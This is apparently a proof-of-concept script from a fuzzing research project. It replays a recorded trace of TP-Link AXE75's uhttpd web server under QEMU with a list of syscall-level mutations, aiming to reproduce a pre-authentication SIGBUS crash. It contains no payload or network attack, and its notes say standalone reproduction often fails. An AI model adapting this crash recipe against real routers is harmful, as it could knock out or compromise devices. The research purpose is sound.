#!/usr/bin/env python3
"""
poc_axe75_ac1fea2c.py — PoC for NB-AXE75-01

Crash:    SIGBUS at PC=0x4082b580 (uhttpd ARM library region)
Signal:   SIGBUS (7)
Count:    146,992 reproductions in rq3_auth_barrier campaign (2026-03-10)
Mutation: NO extend/truncate — boundary_value + replace_buffer_large only
Target:   TP-Link AXE75 uhttpd (ARM32, glibc)
Trace:    tests/seeds/TPLink_AXE75.trace

Vulnerability:
  uhttpd processes HTTP request data. Multiple mutations at sc=57 (boundary_value:
  zero retval), sc=64 (replace_buffer_large: 1024 'A' bytes), sc=90/106
  (interesting_value), sc=164/213 (overwrite_offset) corrupt request parsing
  state. Combined effect causes SIGBUS (alignment fault) at 0x4082b580 in the
  ARM uhttpd glibc library region.

  All mutations are physically achievable via network — no extend bypass.
  Pre-auth: seed trace is unauthenticated GET to uhttpd.

Exploitability: TBD — SIGBUS at 0x4082b580 may indicate alignment-sensitive
  struct parsing; crash is reproducible with network-only mutations.

REPRODUCTION NOTE:
  The crash was confirmed 146,992× in the rq3_auth_barrier campaign using the
  auto-detected squashfs LD_PREFIX from the firmware extraction. Standalone
  reproduction requires the original campaign library environment. In testing
  with verified_targets/rootfs the process exits normally (normal_exit), likely
  because different glibc variants handle the corrupted HTTP parsing differently.
  NOTE: Do NOT use -cpu cortex-a15 — this causes SIGILL in fork server mode.

Usage:
  cd rr_fuzzing
  python3 tests/scripts/fuzzing/poc_axe75_ac1fea2c.py [--max-rounds N]
"""
import sys, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'fuzzing'))

from conductor.qemu_executor import QEMUExecutor
from conductor.conductor_types import FuzzInstruction

ROOTFS     = str(ROOT / 'tests/verified_targets/TPLink_AXE75/rootfs')
MOCK_LIB   = str(ROOT / 'tests/verified_targets/TPLink_AXE75/libubus_mock.so')
BUILD      = str(ROOT / '../../build')
BINARY     = f'{ROOTFS}/usr/sbin/uhttpd'
TRACE      = str(ROOT / 'tests/seeds/TPLink_AXE75.trace')
FORK_POINT = 57   # fork before sc=57 so boundary_value@sc=57 is applied by child
GDB_PORT   = 9998

# Campaign recipe: crash_w0_013685_ac1fea2c
# Signal=SIGBUS(7) PC=0x4082b580 — 146,992 reproductions
MUTATIONS = [
    FuzzInstruction(syscall_index=57, cmd=4, arg_index=1,
                    data=b'\x00\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='boundary_value'),
    FuzzInstruction(syscall_index=164, cmd=11, arg_index=1,
                    data=b'\x0b\xba', offset=0, size=2,
                    mutation_type='overwrite_offset'),
    FuzzInstruction(syscall_index=213, cmd=11, arg_index=1,
                    data=b'\x08G', offset=0, size=2,
                    mutation_type='overwrite_offset'),
    FuzzInstruction(syscall_index=186, cmd=10, arg_index=1,
                    data=b'\x01\x00\x00\x00', offset=0, size=4,
                    mutation_type='light_mutation'),
    FuzzInstruction(syscall_index=64, cmd=2, arg_index=1,
                    data=b'A' * 1024, offset=0, size=1024,
                    mutation_type='replace_buffer_large'),
    FuzzInstruction(syscall_index=90, cmd=9, arg_index=1,
                    data=b'\x00\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='interesting_value'),
    FuzzInstruction(syscall_index=106, cmd=9, arg_index=1,
                    data=b'\xff\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='interesting_value'),
    FuzzInstruction(syscall_index=124, cmd=5, arg_index=1,
                    data=b'\x01\x00\x00\x00', offset=0, size=4,
                    mutation_type='aux_buffer'),
]


def run(max_rounds: int = 5, gdb: bool = False) -> None:
    import os
    extra = []
    if gdb:
        extra += ['-g', str(GDB_PORT)]
    # libubus_mock.so is required — uhttpd calls ubus_connect() at startup
    if os.path.exists(MOCK_LIB):
        extra = ['-E', f'LD_PRELOAD={MOCK_LIB}'] + extra
    executor = QEMUExecutor(
        qemu_path=f'{BUILD}/qemu-arm',
        target_binary=BINARY,
        ld_prefix=ROOTFS,
        timeout=15.0,
        extra_qemu_args=extra,
    )

    print(f'[*] NB-AXE75-01 PoC')
    print(f'[*] Target : {BINARY}')
    print(f'[*] Trace  : {TRACE}')
    print(f'[*] Expect : SIGBUS(7) PC=0x4082b580')
    print()

    crashes = 0
    for rnd in range(1, max_rounds + 1):
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=FORK_POINT,
            mutation_variants=[MUTATIONS],
            depth=0,
            iteration_id=rnd,
        )
        if not results:
            print(f'  round {rnd}: no result')
            continue
        r = results[0]
        crashed = getattr(r, 'crashed', False)
        sig = getattr(r, 'signal_number', None)
        pc  = hex(getattr(r, 'pc', 0) or 0)
        if crashed:
            crashes += 1
            print(f'  round {rnd}: *** CRASH ***  signal={sig} pc={pc}')
            if gdb:
                break
        else:
            print(f'  round {rnd}: {getattr(r, "status_name", "ok")}')

    executor.stop_persistent_qemu()
    print()
    if crashes > 0:
        print(f'★ NB-AXE75-01 CONFIRMED: SIGBUS at 0x4082b580 ({crashes}/{max_rounds} rounds)')
    else:
        print('NB-AXE75-01: NOT reproduced in current environment.')
        print('  The crash was confirmed 146,992x in the rq3_auth_barrier campaign.')
        print('  Reproduction requires the original squashfs firmware library environment.')
        print('  See crash JSON: evaluation/rq3_auth_barrier/tplink/crashes/crash_w0_013685_ac1fea2c.json')


if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--max-rounds', type=int, default=5)
    p.add_argument('--gdb', action='store_true')
    args = p.parse_args()
    run(max_rounds=args.max_rounds, gdb=args.gdb)
